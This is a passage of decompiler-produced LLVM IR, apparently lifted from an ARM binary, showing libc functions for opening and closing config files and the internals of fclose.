  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_177cc = icmp eq i32* %arg1, null
  br i1 %v2_177cc, label %dec_label_pc_177f4, label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %entry
  %v2_177d4 = load i32, i32* %arg1, align 4
  %v1_177d8 = inttoptr i32 %v2_177d4 to i16*
  %v2_177d8 = call i32 @__GI_fclose(i16* %v1_177d8)
  %v0_177dc = load i32, i32* @r4, align 4
  %v1_177dc = add i32 %v0_177dc, 20
  %v2_177dc = inttoptr i32 %v1_177dc to i32*
  %v3_177dc = load i32, i32* %v2_177dc, align 4
  %v2_177e0 = icmp eq i32 %v3_177dc, 0
  br i1 %v2_177e0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_177d4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_177d4, %bb
  store i32 96236, i32* @lr, align 4
  %v1_177e8 = xor i1 %v2_177e0, true
  call void @__pseudo_cond_branch(i1 %v1_177e8, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_177ec = load i32, i32* @r4, align 4
  store i32 %v0_177ec, i32* @r0, align 4
  %v0_177f0 = call i32 @free()
  br label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %entry, %bb6
  %v1_177f8 = phi i32 [ 0, %entry ], [ %v0_177f0, %bb6 ]
  ret i32 %v1_177f8

; uselistorder directives
  uselistorder label %dec_label_pc_177f4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17808 = load i32, i32* @r4, align 4
  store i32 %v3_17808, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -35452), i32* @r1, align 4
  %v0_17810 = call i32 @__GI_fopen()
  store i32 %v0_17810, i32* %r0.global-to-local, align 4
  store i32 %v0_17810, i32* @r4, align 4
  %v2_17814 = icmp eq i32 %v0_17810, 0
  br i1 %v2_17814, label %bb, label %dec_label_pc_17820

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17820:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_17828 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_17828, i32* %r0.global-to-local, align 4
  %v2_1782c = icmp eq i32 %v2_17828, 0
  br i1 %v2_1782c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_17820
  %v1_17830 = load i32, i32* @r4, align 4
  %v3_17830 = inttoptr i32 %v2_17828 to i32*
  store i32 %v1_17830, i32* %v3_17830, align 4
  %v1_17838.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_17820, %bb4
  %v1_17838 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_17820 ], [ %v1_17838.pre, %bb4 ]
  %v2_17834 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17834, i32* @r4, align 4
  ret i32 %v1_17838

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 36, 34, 4, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 2, 1, 0, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17844 = load i32, i32* @r4, align 4
  store i32 %v3_17844, i32* %stack_var_-36, align 4
  %v6_17844 = load i32, i32* @r5, align 4
  %v9_17844 = load i32, i32* @r6, align 4
  %v12_17844 = load i32, i32* @r7, align 4
  %v2_17848 = add i32 %tmp, 52
  %v3_17848 = inttoptr i32 %v2_17848 to i32*
  %v4_17848 = load i32, i32* %v3_17848, align 4
  store i32 %v4_17848, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17850 = icmp eq i32 %v4_17848, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r8, align 4
  br i1 %v2_17850, label %dec_label_pc_17864, label %dec_label_pc_178c8

dec_label_pc_17864:                               ; preds = %entry
  %v0_17864 = call i32 @__aeabi_read_tp()
  store i32 %v0_17864, i32* %r0.global-to-local, align 4
  %v0_17868 = load i32, i32* @r5, align 4
  %v1_17868 = add i32 %v0_17868, 64
  %v2_17868 = inttoptr i32 %v1_17868 to i32*
  %v3_17868 = load i32, i32* %v2_17868, align 4
  store i32 %v3_17868, i32* %r3.global-to-local, align 4
  %v1_1786c = add i32 %v0_17864, -1168
  store i32 %v1_1786c, i32* @r6, align 4
  %v3_17870 = icmp uge i32 %v3_17868, %v1_1786c
  store i1 %v3_17870, i1* %cpsr_c.global-to-local, align 1
  %v9_17870 = icmp eq i32 %v3_17868, %v1_1786c
  br i1 %v9_17870, label %dec_label_pc_178bc, label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_17864
  %v1_17878 = add i32 %v0_17868, 56
  store i32 %v1_17878, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17878, i32* %r2.global-to-local, align 4
  %v0_17884 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17884, i32* @r4, align 4
  %v1_17888115 = inttoptr i32 %v1_17878 to i32*
  %v2_17888116 = load i32, i32* %v1_17888115, align 4
  store i32 %v2_17888116, i32* %r3.global-to-local, align 4
  %v3_1788c118 = icmp uge i32 %v2_17888116, %v0_17884
  store i1 %v3_1788c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1788c124 = icmp eq i32 %v2_17888116, %v0_17884
  br i1 %v9_1788c124, label %dec_label_pc_17894, label %dec_label_pc_178ac

dec_label_pc_17894:                               ; preds = %dec_label_pc_17878, %dec_label_pc_17894.dec_label_pc_17888_crit_edge
  %v0_17894125 = phi i32 [ %v1_1788c.pre, %dec_label_pc_17894.dec_label_pc_17888_crit_edge ], [ %v0_17884, %dec_label_pc_17878 ]
  store i32 %v0_17894125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_178a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_178a4, label %dec_label_pc_178a8, label %dec_label_pc_17894.dec_label_pc_17888_crit_edge

dec_label_pc_17894.dec_label_pc_17888_crit_edge:  ; preds = %dec_label_pc_17894
  %v0_17888.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1788c.pre = load i32, i32* @r4, align 4
  %v1_17888 = inttoptr i32 %v0_17888.pre to i32*
  %v2_17888 = load i32, i32* %v1_17888, align 4
  store i32 %v2_17888, i32* %r3.global-to-local, align 4
  %v3_1788c = icmp uge i32 %v2_17888, %v1_1788c.pre
  store i1 %v3_1788c, i1* %cpsr_c.global-to-local, align 1
  %v9_1788c = icmp eq i32 %v2_17888, %v1_1788c.pre
  br i1 %v9_1788c, label %dec_label_pc_17894, label %dec_label_pc_178ac

dec_label_pc_178a8:                               ; preds = %dec_label_pc_17894
  %v0_178a8 = load i32, i32* @r4, align 4
  store i32 %v0_178a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178ac

dec_label_pc_178ac:                               ; preds = %dec_label_pc_17878, %dec_label_pc_17894.dec_label_pc_17888_crit_edge, %dec_label_pc_178a8
  %v0_178ac = phi i32 [ %v0_178a8, %dec_label_pc_178a8 ], [ %v2_17888116, %dec_label_pc_17878 ], [ %v2_17888, %dec_label_pc_17894.dec_label_pc_17888_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_178ac = icmp eq i32 %v0_178ac, 0
  br i1 %v2_178ac, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_178ac
  %v1_178b0 = load i32, i32* @r7, align 4
  store i32 %v1_178b0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_178ac, %bb
  %v1_178b4 = xor i1 %v2_178ac, true
  call void @__pseudo_cond_branch(i1 %v1_178b4, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_178b8 = load i32, i32* @r6, align 4
  %v1_178b8 = load i32, i32* @r5, align 4
  %v2_178b8 = add i32 %v1_178b8, 64
  %v3_178b8 = inttoptr i32 %v2_178b8 to i32*
  store i32 %v0_178b8, i32* %v3_178b8, align 4
  %v0_178bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_178bc

dec_label_pc_178bc:                               ; preds = %dec_label_pc_17864, %bb41
  %v0_178bc = phi i32 [ %v0_17868, %dec_label_pc_17864 ], [ %v0_178bc.pre, %bb41 ]
  %v1_178bc = add i32 %v0_178bc, 60
  %v2_178bc = inttoptr i32 %v1_178bc to i32*
  %v3_178bc = load i32, i32* %v2_178bc, align 4
  %v1_178c0 = add i32 %v3_178bc, 1
  store i32 %v1_178c0, i32* %r3.global-to-local, align 4
  store i32 %v1_178c0, i32* %v2_178bc, align 4
  %v0_178c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_178c8

dec_label_pc_178c8:                               ; preds = %entry, %dec_label_pc_178bc
  %v1_178d0 = phi i32 [ %tmp, %entry ], [ %v0_178c8.pre, %dec_label_pc_178bc ]
  %v1_178c8 = inttoptr i32 %v1_178d0 to i16*
  %v2_178c8 = load i16, i16* %v1_178c8, align 2
  %v3_178c8 = zext i16 %v2_178c8 to i32
  store i32 %v3_178c8, i32* %r3.global-to-local, align 4
  %v1_178cc = and i32 %v3_178c8, 64
  %v2_178cc = icmp eq i32 %v1_178cc, 0
  br i1 %v2_178cc, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_178c8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_178c8, %bb42
  %storemerge = phi i32 [ %v1_178d0, %bb42 ], [ %v1_178cc, %dec_label_pc_178c8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 96472, i32* @lr, align 4
  %v1_178d4 = xor i1 %v2_178cc, true
  call void @__pseudo_cond_branch(i1 %v1_178d4, i32 ptrtoint (i32* @global_var_18718.797 to i32))
  %v0_178d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_178d8, i32* %fp.global-to-local, align 4
  %v0_178dc = load i32, i32* @r5, align 4
  %v1_178dc = add i32 %v0_178dc, 4
  %v2_178dc = inttoptr i32 %v1_178dc to i32*
  %v3_178dc = load i32, i32* %v2_178dc, align 4
  store i32 %v3_178dc, i32* %r0.global-to-local, align 4
  %v1_178e0 = call i32 @__GI___libc_close(i32 %v3_178dc)
  store i32 %v1_178e0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_178e8 = load i32, i32* @r8, align 4
  %v2_178e8 = add i32 %v0_178e8, 160
  %v3_178e8 = inttoptr i32 %v2_178e8 to i32*
  %v4_178e8 = load i32, i32* %v3_178e8, align 4
  store i32 %v4_178e8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_178ec = icmp slt i32 %v1_178e0, 0
  br i1 %v1_178ec, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_178f4 = add i32 %v4_178e8, 8
  %v2_178f4 = inttoptr i32 %v1_178f4 to i32*
  %v3_178f4 = load i32, i32* %v2_178f4, align 4
  store i32 %v3_178f4, i32* %r3.global-to-local, align 4
  %v0_178f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_178f8, i32* %r0.global-to-local, align 4
  %v1_178fc = add i32 %v0_178f8, -1168
  store i32 %v1_178fc, i32* %sl.global-to-local, align 4
  %v0_17900 = load i32, i32* %r3.global-to-local, align 4
  %v3_17900 = icmp uge i32 %v0_17900, %v1_178fc
  store i1 %v3_17900, i1* %cpsr_c.global-to-local, align 1
  %v9_17900 = icmp eq i32 %v0_17900, %v1_178fc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_17908 = load i32, i32* @r5, align 4
  %v2_17908 = add i32 %v1_17908, 4
  %v3_17908 = inttoptr i32 %v2_17908 to i32*
  store i32 -1, i32* %v3_17908, align 4
  br i1 %v9_17900, label %dec_label_pc_17950, label %dec_label_pc_17910

dec_label_pc_17910:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_17914 = load i32, i32* @r7, align 4
  store i32 %v0_17914, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1791c108 = inttoptr i32 %v0_17914 to i32*
  %v2_1791c109 = load i32, i32* %v1_1791c108, align 4
  store i32 %v2_1791c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17920111 = icmp eq i32 %v2_1791c109, 0
  br i1 %v9_17920111, label %dec_label_pc_17928, label %dec_label_pc_17940

dec_label_pc_17928:                               ; preds = %dec_label_pc_17910, %dec_label_pc_17928.dec_label_pc_1791c_crit_edge
  %v0_17928112 = phi i32 [ %v1_17920.pre, %dec_label_pc_17928.dec_label_pc_1791c_crit_edge ], [ 0, %dec_label_pc_17910 ]
  store i32 %v0_17928112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17938 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17938, label %dec_label_pc_1793c, label %dec_label_pc_17928.dec_label_pc_1791c_crit_edge

dec_label_pc_17928.dec_label_pc_1791c_crit_edge:  ; preds = %dec_label_pc_17928
  %v0_1791c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17920.pre = load i32, i32* @r4, align 4
  %v1_1791c = inttoptr i32 %v0_1791c.pre to i32*
  %v2_1791c = load i32, i32* %v1_1791c, align 4
  store i32 %v2_1791c, i32* %r3.global-to-local, align 4
  %v3_17920 = icmp uge i32 %v2_1791c, %v1_17920.pre
  store i1 %v3_17920, i1* %cpsr_c.global-to-local, align 1
  %v9_17920 = icmp eq i32 %v2_1791c, %v1_17920.pre
  br i1 %v9_17920, label %dec_label_pc_17928, label %dec_label_pc_17940

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17928
  %v0_1793c = load i32, i32* @r4, align 4
  store i32 %v0_1793c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %dec_label_pc_17910, %dec_label_pc_17928.dec_label_pc_1791c_crit_edge, %dec_label_pc_1793c
  %v0_17940 = phi i32 [ %v0_1793c, %dec_label_pc_1793c ], [ %v2_1791c109, %dec_label_pc_17910 ], [ %v2_1791c, %dec_label_pc_17928.dec_label_pc_1791c_crit_edge ]
  %v1_17940 = phi i32 [ %v0_1793c, %dec_label_pc_1793c ], [ 0, %dec_label_pc_17910 ], [ %v1_17920.pre, %dec_label_pc_17928.dec_label_pc_1791c_crit_edge ]
  %v3_17940 = icmp uge i32 %v0_17940, %v1_17940
  store i1 %v3_17940, i1* %cpsr_c.global-to-local, align 1
  %v9_17940 = icmp eq i32 %v0_17940, %v1_17940
  br i1 %v9_17940, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_17940
  %v1_17944 = load i32, i32* @r7, align 4
  store i32 %v1_17944, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17940, %bb46
  %v1_17948 = xor i1 %v9_17940, true
  call void @__pseudo_cond_branch(i1 %v1_17948, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_1794c = load i32, i32* %sl.global-to-local, align 4
  %v1_1794c = load i32, i32* @r7, align 4
  %v2_1794c = add i32 %v1_1794c, 8
  %v3_1794c = inttoptr i32 %v2_1794c to i32*
  store i32 %v0_1794c, i32* %v3_1794c, align 4
  br label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17954 = load i32, i32* @r8, align 4
  %v2_17954 = add i32 %v0_17954, 160
  %v3_17954 = inttoptr i32 %v2_17954 to i32*
  %v4_17954 = load i32, i32* %v3_17954, align 4
  store i32 %v4_17954, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1795c = add i32 %v0_17954, 12
  %v3_1795c = inttoptr i32 %v2_1795c to i32*
  %v4_1795c = load i32, i32* %v3_1795c, align 4
  store i32 %v4_1795c, i32* %r2.global-to-local, align 4
  %v1_17960 = add i32 %v4_17954, 4
  %v2_17960 = inttoptr i32 %v1_17960 to i32*
  %v3_17960 = load i32, i32* %v2_17960, align 4
  store i32 %v3_17960, i32* %r1.global-to-local, align 4
  %v1_17964 = inttoptr i32 %v4_1795c to i32*
  %v2_17964 = load i32, i32* %v1_17964, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17968 = icmp eq i32 %v3_17960, 0
  %v1_1796c = add i32 %v2_17964, 1
  store i32 %v1_1796c, i32* %r3.global-to-local, align 4
  store i32 %v1_1796c, i32* %v1_17964, align 4
  br i1 %v2_17968, label %dec_label_pc_17978, label %dec_label_pc_179d8

dec_label_pc_17978:                               ; preds = %dec_label_pc_17950
  %v0_17978 = load i32, i32* %r1.global-to-local, align 4
  %v1_17978 = load i32, i32* %r0.global-to-local, align 4
  %v2_17978 = add i32 %v1_17978, 8
  %v3_17978 = inttoptr i32 %v2_17978 to i32*
  store i32 %v0_17978, i32* %v3_17978, align 4
  %v0_1797c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1797c, i32* @r7, align 4
  br label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %dec_label_pc_179b0.dec_label_pc_17980_crit_edge, %dec_label_pc_17978
  %v0_17980 = phi i32 [ %v0_17980.pre, %dec_label_pc_179b0.dec_label_pc_17980_crit_edge ], [ %v0_1797c, %dec_label_pc_17978 ]
  %v1_17980 = inttoptr i32 %v0_17980 to i32*
  %v2_17980 = load i32, i32* %v1_17980, align 4
  store i32 %v2_17980, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17980, i32* %r2.global-to-local, align 4
  %v2_1798c96 = load i32, i32* %v1_17980, align 4
  store i32 %v2_1798c96, i32* %r3.global-to-local, align 4
  %v3_1799098 = icmp uge i32 %v2_1798c96, %v2_17980
  store i1 %v3_1799098, i1* %cpsr_c.global-to-local, align 1
  %v9_17990104 = icmp eq i32 %v2_1798c96, %v2_17980
  br i1 %v9_17990104, label %dec_label_pc_17998, label %dec_label_pc_179b0

dec_label_pc_17998:                               ; preds = %dec_label_pc_17980, %dec_label_pc_17998.dec_label_pc_1798c_crit_edge
  %v0_17998105 = phi i32 [ %v1_17990.pre, %dec_label_pc_17998.dec_label_pc_1798c_crit_edge ], [ %v2_17980, %dec_label_pc_17980 ]
  store i32 %v0_17998105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_179a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_179a8, label %dec_label_pc_179ac, label %dec_label_pc_17998.dec_label_pc_1798c_crit_edge

dec_label_pc_17998.dec_label_pc_1798c_crit_edge:  ; preds = %dec_label_pc_17998
  %v0_1798c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17990.pre = load i32, i32* @r4, align 4
  %v1_1798c = inttoptr i32 %v0_1798c.pre to i32*
  %v2_1798c = load i32, i32* %v1_1798c, align 4
  store i32 %v2_1798c, i32* %r3.global-to-local, align 4
  %v3_17990 = icmp uge i32 %v2_1798c, %v1_17990.pre
  store i1 %v3_17990, i1* %cpsr_c.global-to-local, align 1
  %v9_17990 = icmp eq i32 %v2_1798c, %v1_17990.pre
  br i1 %v9_17990, label %dec_label_pc_17998, label %dec_label_pc_179b0

dec_label_pc_179ac:                               ; preds = %dec_label_pc_17998
  %v0_179ac = load i32, i32* @r4, align 4
  store i32 %v0_179ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179b0

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17980, %dec_label_pc_17998.dec_label_pc_1798c_crit_edge, %dec_label_pc_179ac
  %v0_179b8 = phi i32 [ %v0_179ac, %dec_label_pc_179ac ], [ %v2_1798c96, %dec_label_pc_17980 ], [ %v2_1798c, %dec_label_pc_17998.dec_label_pc_1798c_crit_edge ]
  %v1_179b0 = phi i32 [ %v0_179ac, %dec_label_pc_179ac ], [ %v2_17980, %dec_label_pc_17980 ], [ %v1_17990.pre, %dec_label_pc_17998.dec_label_pc_1798c_crit_edge ]
  %v3_179b0 = icmp uge i32 %v0_179b8, %v1_179b0
  store i1 %v3_179b0, i1* %cpsr_c.global-to-local, align 1
  %v9_179b0 = icmp eq i32 %v0_179b8, %v1_179b0
  br i1 %v9_179b0, label %dec_label_pc_179b8, label %dec_label_pc_179b0.dec_label_pc_17980_crit_edge

dec_label_pc_179b0.dec_label_pc_17980_crit_edge:  ; preds = %dec_label_pc_179b0
  %v0_17980.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17980

dec_label_pc_179b8:                               ; preds = %dec_label_pc_179b0
  %v2_179b8 = icmp ne i32 %v1_179b0, 0
  store i1 %v2_179b8, i1* %cpsr_c.global-to-local, align 1
  %v7_179bc = icmp slt i32 %v1_179b0, 2
  br i1 %v7_179bc, label %dec_label_pc_179d8, label %dec_label_pc_179c0

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179b8
  %v0_179c0 = load i32, i32* @r7, align 4
  store i32 %v0_179c0, i32* %r0.global-to-local, align 4
  %v0_179c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_179c4 = add i32 %v0_179c4, 129
  store i32 %v1_179c4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %dec_label_pc_17950, %dec_label_pc_179c0, %dec_label_pc_179b8
  %v0_179d8 = load i32, i32* @r5, align 4
  %v1_179d8 = inttoptr i32 %v0_179d8 to i16*
  %v2_179d8 = load i16, i16* %v1_179d8, align 2
  %v3_179d8 = zext i16 %v2_179d8 to i32
  %v1_179dc = and i32 %v3_179d8, 24576
  %v1_179e0 = or i32 %v1_179dc, 48
  store i32 %v1_179e0, i32* %r3.global-to-local, align 4
  %v0_179e4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179e4 = icmp eq i32 %v0_179e4, 0
  %v1_179e8 = trunc i32 %v1_179e0 to i16
  store i16 %v1_179e8, i16* %v1_179d8, align 2
  br i1 %v2_179e4, label %dec_label_pc_179f0, label %dec_label_pc_17a64

dec_label_pc_179f0:                               ; preds = %dec_label_pc_179d8
  %v0_179f0 = load i32, i32* @r5, align 4
  %v1_179f0 = add i32 %v0_179f0, 60
  %v2_179f0 = inttoptr i32 %v1_179f0 to i32*
  %v3_179f0 = load i32, i32* %v2_179f0, align 4
  %v1_179f4 = add i32 %v3_179f0, -1
  store i32 %v1_179f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179f8 = icmp eq i32 %v1_179f4, 0
  store i32 %v1_179f4, i32* %v2_179f0, align 4
  br i1 %v2_179f8, label %dec_label_pc_17a04, label %dec_label_pc_17a64

dec_label_pc_17a04:                               ; preds = %dec_label_pc_179f0
  %v0_17a04 = load i32, i32* %r3.global-to-local, align 4
  %v1_17a04 = load i32, i32* @r5, align 4
  %v2_17a04 = add i32 %v1_17a04, 64
  %v3_17a04 = inttoptr i32 %v2_17a04 to i32*
  store i32 %v0_17a04, i32* %v3_17a04, align 4
  %v0_17a08 = load i32, i32* @r5, align 4
  %v1_17a08 = add i32 %v0_17a08, 56
  store i32 %v1_17a08, i32* @r6, align 4
  br label %dec_label_pc_17a0c

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_17a3c.dec_label_pc_17a0c_crit_edge, %dec_label_pc_17a04
  %v0_17a14 = phi i32 [ %v0_17a14.pre, %dec_label_pc_17a3c.dec_label_pc_17a0c_crit_edge ], [ %v1_17a08, %dec_label_pc_17a04 ]
  %v0_17a0c = phi i32 [ %v0_17a0c.pre, %dec_label_pc_17a3c.dec_label_pc_17a0c_crit_edge ], [ %v0_17a08, %dec_label_pc_17a04 ]
  %v1_17a0c = add i32 %v0_17a0c, 56
  %v2_17a0c = inttoptr i32 %v1_17a0c to i32*
  %v3_17a0c = load i32, i32* %v2_17a0c, align 4
  store i32 %v3_17a0c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a14, i32* %r2.global-to-local, align 4
  %v1_17a1882 = inttoptr i32 %v0_17a14 to i32*
  %v2_17a1883 = load i32, i32* %v1_17a1882, align 4
  store i32 %v2_17a1883, i32* %r3.global-to-local, align 4
  %v3_17a1c85 = icmp uge i32 %v2_17a1883, %v3_17a0c
  store i1 %v3_17a1c85, i1* %cpsr_c.global-to-local, align 1
  %v9_17a1c91 = icmp eq i32 %v2_17a1883, %v3_17a0c
  br i1 %v9_17a1c91, label %dec_label_pc_17a24, label %dec_label_pc_17a3c

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a0c, %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge
  %v0_17a2492 = phi i32 [ %v1_17a1c.pre, %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge ], [ %v3_17a0c, %dec_label_pc_17a0c ]
  store i32 %v0_17a2492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a34 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a34, label %dec_label_pc_17a38, label %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge

dec_label_pc_17a24.dec_label_pc_17a18_crit_edge:  ; preds = %dec_label_pc_17a24
  %v0_17a18.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a1c.pre = load i32, i32* @r4, align 4
  %v1_17a18 = inttoptr i32 %v0_17a18.pre to i32*
  %v2_17a18 = load i32, i32* %v1_17a18, align 4
  store i32 %v2_17a18, i32* %r3.global-to-local, align 4
  %v3_17a1c = icmp uge i32 %v2_17a18, %v1_17a1c.pre
  store i1 %v3_17a1c, i1* %cpsr_c.global-to-local, align 1
  %v9_17a1c = icmp eq i32 %v2_17a18, %v1_17a1c.pre
  br i1 %v9_17a1c, label %dec_label_pc_17a24, label %dec_label_pc_17a3c

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a24
  %v0_17a38 = load i32, i32* @r4, align 4
  store i32 %v0_17a38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a3c

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17a0c, %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge, %dec_label_pc_17a38
  %v0_17a44 = phi i32 [ %v0_17a38, %dec_label_pc_17a38 ], [ %v2_17a1883, %dec_label_pc_17a0c ], [ %v2_17a18, %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge ]
  %v1_17a3c = phi i32 [ %v0_17a38, %dec_label_pc_17a38 ], [ %v3_17a0c, %dec_label_pc_17a0c ], [ %v1_17a1c.pre, %dec_label_pc_17a24.dec_label_pc_17a18_crit_edge ]
  %v3_17a3c = icmp uge i32 %v0_17a44, %v1_17a3c
  store i1 %v3_17a3c, i1* %cpsr_c.global-to-local, align 1
  %v9_17a3c = icmp eq i32 %v0_17a44, %v1_17a3c
  br i1 %v9_17a3c, label %dec_label_pc_17a44, label %dec_label_pc_17a3c.dec_label_pc_17a0c_crit_edge

dec_label_pc_17a3c.dec_label_pc_17a0c_crit_edge:  ; preds = %dec_label_pc_17a3c
  %v0_17a0c.pre = load i32, i32* @r5, align 4
  %v0_17a14.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17a0c

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a3c
  %v2_17a44 = icmp ne i32 %v1_17a3c, 0
  store i1 %v2_17a44, i1* %cpsr_c.global-to-local, align 1
  %v7_17a48 = icmp slt i32 %v1_17a3c, 2
  br i1 %v7_17a48, label %dec_label_pc_17a64, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a44
  %v0_17a4c = load i32, i32* @r5, align 4
  %v1_17a4c = add i32 %v0_17a4c, 56
  store i32 %v1_17a4c, i32* %r0.global-to-local, align 4
  %v0_17a50 = load i32, i32* %r1.global-to-local, align 4
  %v1_17a50 = add i32 %v0_17a50, 129
  store i32 %v1_17a50, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a64

